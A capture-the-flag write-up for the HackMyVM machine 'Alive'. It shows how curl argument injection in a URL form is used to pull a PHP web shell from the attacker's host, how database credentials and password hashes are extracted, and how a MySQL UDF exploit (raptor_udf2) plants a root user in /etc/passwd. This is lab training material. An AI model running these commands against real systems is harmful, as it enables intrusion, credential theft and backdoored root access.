# Alive

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.158:22
Open 10.0.2.158:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.158
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 26:9c:17:ef:21:36:3d:01:c3:1d:6b:0d:47:11:cd:58 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTL7GmZIj6NqWyxTUtZn6hsRMQgbBHIKFgQmG0/nOM+RnEIU0a3FQNB1REG3ohE1tpL1PGb/DP1dYfMNKNzfOd/tnCu1M6CzU3/qDlPddeuKZayIrK6KXAjbcmUzw9tKhARTRqKm4IK8/MCKGVDeHX1fK70k9y1nQHm5hfE3k/thbnHTEEC9vPkgBlIehXWtXKzfKyYNY8vO1+6/Mdyb2wbh1L7vtP8um5saQiJo5sCFzHk59F/aAfiuXZLcGob3JDqMYU85fdyo71gjbq/qciwGRAGTkb00vPR2xeGlAhYQLToE4QByN0K/KJtKfr5IYv/9jBcB+wHCVwsGgrS1ppsHktk0z1l9X4Zvz8jvGUwvNTML6CcKtQwEtxrFNdF3gZYTYqX9z2O5+EAf3R6QyDPFKXr14d67eT/x+dRmCOxWir4ASSj8g48epo2Tb3x2kxI9M7n16474VV9KfCwQOa19aL7HvY8iA+QFCHhBOSD2FEdVVS3hoQzVFvqVfD+H8=
|   256 29:26:68:49:b0:37:5c:0e:7b:6d:81:8d:60:98:8d:fc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ7MmcAJiA3Fcr1QL/is5Z4RmZEGe6CI4QN09vxmoL9hzzkPIzjwUgi8X/ss2DfFRL6Mq0QYwyFJUCOec6L60ZA=
|   256 13:2e:13:19:0c:9d:a3:a7:3e:b8:df:ab:97:08:41:88 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMTydr+AvAZMJXjRDFddEqebjeQuZDKQPqPFTYxgOLc4
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
|_http-title: Host alive
|_http-server-header: Apache/2.4.54 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/alive/writeup.png)

```bash
└─$ dirtypipe 80
Server on port 80...
--- Request at 2025-12-23 18:34:15 ---
Client: 10.0.2.158:38652
Method: GET
Path: /
Headers:
  Host: 10.0.2.149
  User-Agent: curl/7.74.0
  Accept: */*
==================================================
└─$ curl alive.hmv -d 'url=http://10.0.2.149'
```

`;`, `&&`, `||` were not working, so it must want actual flags for `curl`

It didn't error, but PWD must be not writable
```bash
└─$ curl alive.hmv --data-urlencode 'url=http://127.0.0.1 -o hi.html'
└─$ curl alive.hmv/hi.html -si | head -1
HTTP/1.1 404 Not Found
```

```bash
└─$ feroxbuster -u http://alive.hmv --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt
200      GET       69l      138w     1597c http://alive.hmv/
200      GET       69l      138w     1597c http://alive.hmv/index.php
301      GET        9l       28w      304c http://alive.hmv/tmp => http://alive.hmv/tmp/
```

### RCE

```bash
└─$ curl alive.hmv --data-urlencode 'url=http://127.0.0.1 -o tmp/hi.html'
└─$ curl alive.hmv/tmp/hi.html -si | head -1
HTTP/1.1 200 OK
```

```bash
└─$ curl alive.hmv --data-urlencode 'url=http://10.0.2.149/shell.php -o tmp/shell.php'
```

![writeup-1.png](/assets/pentest/hackmyvm/alive/writeup-1.png)

## Lateral Movement

Database credentials
```bash
www-data@alive.hmv:…/www/code# cat index.php
<?php
    $servername = "localhost";
    $username = "admin";
    $password = "HeLL0alI4ns";
    $dbname = "digitcode";
```

### MySQL

Not very useful
```bash
www-data@alive.hmv:…/www/code# mysql -u'admin' -p'HeLL0alI4ns' -e 'SHOW DATABASES;'
Database
digitcode
information_schema
mysql
performance_schema
qdpm_db

www-data@alive.hmv:…/www/code# mysql -u'admin' -p'HeLL0alI4ns' digitcode -e 'SHOW TABLES;'
Tables_in_digitcode
code
path

www-data@alive.hmv:…/www/code# mysql -u'admin' -p'HeLL0alI4ns' digitcode -e 'SELECT * FROM code;'
id	digit
1	494147203525673

www-data@alive.hmv:…/www/code# mysql -u'admin' -p'HeLL0alI4ns' digitcode -e 'SELECT * FROM path;'
id	url
1	qdpmApp
```

There's 1 more application inside, it has same database config but different user.
```bash
www-data@alive.hmv:…/code/qdpmApp# cat core/config/databases.yml

all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qdpm_db;host=localhost;port=3306'
      profiler: false
      username: qdpmUser
      password: "<?php echo urlencode('HeLL0alI4ns') ; ?>"
      attributes:
        quote_identifier: true


www-data@alive.hmv:…/code/qdpmApp# mysql -u'qdpmUser' -p'HeLL0alI4ns' -e 'SHOW DATABASES;'
Database
information_schema
qdpm_db

www-data@alive.hmv:…/code/qdpmApp# mysql -u'qdpmUser' -p'HeLL0alI4ns' qdpm_db -e 'SHOW TABLES;'
Tables_in_qdpm_db
attachments
configuration
departments
discussions
discussions_comments
discussions_reports
discussions_status
events
extra_fields
extra_fields_list
phases
phases_status
projects
projects_comments
projects_phases
projects_reports
projects_status
projects_types
tasks
tasks_comments
tasks_groups
tasks_labels
tasks_priority
tasks_status
tasks_types
tickets
tickets_comments
tickets_reports
tickets_status
tickets_types
user_reports
users
users_groups
versions
versions_status

www-data@alive.hmv:…/code/qdpmApp# mysql -u'qdpmUser' -p'HeLL0alI4ns' qdpm_db -e 'SELECT * FROM users;'
id	users_group_id	name	photo	email	culture	password	active	skin
3	1	administrator		administrator@alive.hmv		$P$EXzIrSSSu7iTu2wc9sFTh29F7Ajn371	1	NULL
```

Most probably not cracking...
```bash
PS > john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
```

Maybe `mysql` passwords are crackable?
```bash
www-data@alive.hmv:…/code/qdpmApp# mysql -u'admin' -p'HeLL0alI4ns' mysql -e 'SELECT user,password FROM user'
user	password
root	*88B2B2E7392C149CE6B704871A568FD35798F9B8
root	*88B2B2E7392C149CE6B704871A568FD35798F9B8
root	*88B2B2E7392C149CE6B704871A568FD35798F9B8
admin	*D805A6D02F8831ADFB8F1D3E3244B98DF5D5B792
qdpmUser	*D805A6D02F8831ADFB8F1D3E3244B98DF5D5B792
user	*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
admin	*D805A6D02F8831ADFB8F1D3E3244B98DF5D5B792
```

![writeup-2.png](/assets/pentest/hackmyvm/alive/writeup-2.png)

Mysql is running as root
```bash
www-data@alive.hmv:…/code/qdpmApp# ps -eo user,pid,command | grep mysql
root         465 /bin/sh /usr/local/mysql/bin/mysqld_safe --user=root --bind-address=127.0.0.1 --socket=/run/mysqld/mysqld.sock
root         566 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=root --bind-address=127.0.0.1 --log-error=/usr/local/mysql/data/alive.hmv.err --pid-file=alive.hmv.pid --socket=/run/mysqld/mysqld.sock
www-data   10006 sh -c ps -eo user,pid,command | grep mysql 2>&1
www-data   10008 grep mysql
```

### Privilege Escalation via library

- [https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library](https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library)

```bash
www-data@alive.hmv:/tmp$ curl https://www.exploit-db.com/download/1518 -so raptor.c
www-data@alive.hmv:/tmp$ gcc -g -c raptor.c
www-data@alive.hmv:/tmp$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor.o -lc

www-data@alive.hmv:/tmp# mysql -u'root' -p'thecondor' mysql -e "show variables like '%plugin%';"
Variable_name	Value
plugin_dir	/usr/local/mysql/lib/plugin/
plugin_maturity	gamma

www-data@alive.hmv:/tmp# mysql -u'root' -p'thecondor' mysql -e "SHOW VARIABLES LIKE 'secure_file_priv' \G"
*************************** 1. row ***************************
Variable_name: secure_file_priv
        Value:
        
www-data@alive.hmv:/tmp$ cp raptor_udf2.so /usr/local/mysql/lib/plugin/raptor_udf2.so
www-data@alive.hmv:/tmp$ mysql -u'root' -p'thecondor' mysql -e "CREATE FUNCTION do_system RETURNS INTEGER soname 'raptor_udf2.so';"

# Function is loaded
www-data@alive.hmv:/tmp$ mysql -u'root' -p'thecondor' mysql -e "SELECT * FROM mysql.func;"
name	ret	dl	type
do_system	2	raptor_udf2.so	function
```

For some reason the `/tmp` directory was not writeable like `id > /tmp/id` via `do_system` and I was not able to get output. Since I didn't want reverse shell I created a local user.
```bash
└─$ echo "echo 'letmein:$(openssl passwd -6 'Password123$'):0:0:letmein:/root:/bin/bash' >> /etc/passwd" | base64 -w0
ZWNobyAnbGV0bWVpbjokNiRkR2prVEVrU2xXMVNJSVoxJDhJQzdyY2JTaUhvWGoyQ3plYS9UeXE4QUhYNER4Q0FtYW5sVXhQOXU5bTVVMjFYa3hUUjRBMG9VTTlyZ1RSMy9SWnRiZTB3aFBOTE0xczRzVVR6Zk4vOjA6MDpsZXRtZWluOi9yb290Oi9iaW4vYmFzaCcgPj4gL2V0Yy9wYXNzd2QK 
---
www-data@alive.hmv:…/html/tmp$ mysql -u'root' -p'thecondor' -e "SELECT do_system('echo ZWNobyAnbGV0bWVpbjokNiRkR2prVEVrU2xXMVNJSVoxJDhJQzdyY2JTaUhvWGoyQ3plYS9UeXE4QUhYNER4Q0FtYW5sVXhQOXU5bTVVMjFYa3hUUjRBMG9VTTlyZ1RSMy9SWnRiZTB3aFBOTE0xczRzVVR6Zk4vOjA6MDpsZXRtZWluOi9yb290Oi9iaW4vYmFzaCcgPj4gL2V0Yy9wYXNzd2QK | base64 -d | bash');"
```

::: info Note
Password contained lots of `$` and escaping is hell sometimes in bash, nothing little encoding can't fix.
:::

## Flags

```bash
└─$ sshpass -p 'Password123$' ssh letmein@10.0.2.158 'cat /home/alexandra/user.txt /root/root.txt'
1637c0ee2d19e925bd6394c847a62ed5
819be2c3422a6121dac7e8b1da21ce32
```